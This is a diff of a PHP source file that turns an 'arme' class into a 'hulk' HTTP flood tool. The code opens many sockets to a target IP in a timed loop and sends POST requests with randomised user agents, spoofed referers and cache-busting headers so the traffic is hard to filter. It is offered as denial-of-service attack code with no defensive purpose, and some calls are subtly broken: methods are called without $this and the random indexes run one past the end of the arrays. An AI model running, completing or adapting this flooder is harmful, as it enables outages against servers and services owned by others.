@@ -1,6 +1,6 @@
 <?php
 include_once "../header.php";
-class arme{
+class hulk{
 	public $ip;
 	public $port;
 	public $timedout;
@@ -13,7 +13,7 @@ class arme{
 		$this->socketn = $socketn;
 		$this->max_time = $max_time;
 	}
-	public function start(){
+	private function randomuseragent(){
 		$armetomb=array(
 		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
@@ -63,20 +63,40 @@ class arme{
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1");
+		return $armetomb[rand(0, sizeof($armetomb)];
+	}
+	private function referer_list(){
+		$refarray=array("http://www.google.com/?q=",
+            "http://www.usatoday.com/search/results?q=",
+            "http://engadget.search.aol.com/search?q=",
+            "http://" . $this->ip . "/");
+		return $refarray[rand(0, sizeof($refarray)];
+	}
+	private function RandomString($size){
+    	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    	$randstring = '';
+    	for ($i = 0; $i < $size; $i++) {
+        	$randstring.= $characters[rand(0, strlen($characters))];
+    	}
+    	return $randstring;
+	}
+	public function start(){
 		$packet = 0;
 		while(1){
 			if(time() >= $this->max_time){
 				return $packet;
 				break; 
 			}
-			
-			$rand=rand(0, 47);
 			for($i=0;$i<=$this->socketn;$i++){
 				$fp[$i]=fsockopen($this->ip,$this->port,$errno,$errstr,$this->timedout);
-				$out="HEAD / HTTP/1.1\r\n";
+				$out="POST / HTTP/1.1\r\n";
 				$out.="Host: ".$this->ip."\r\n";
-				$out.="User-Agent: ".$armetomb[$rand]."\r\n";
+				$out.="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+				$out.="Cache-Control: no-cache\r\n";
+				$out.="Referer: ".referer_list().RandomString(rand(0, 5))."\r\n";
+				$out.="Keep-Alive: ".rand(110, 120)."\r\n";
 				$out.= "Connection: keep-alive\r\n";
+				$out.="User-Agent: ".randomuseragent()."\r\n";
 				$out.= "\r\n";
 				$packet++;
 				fwrite($fp[$i],$out);
@@ -85,7 +105,6 @@ class arme{
 				fclose($fp[$j]);
 			}
 		}
-		
 	}
-
 }
+?>
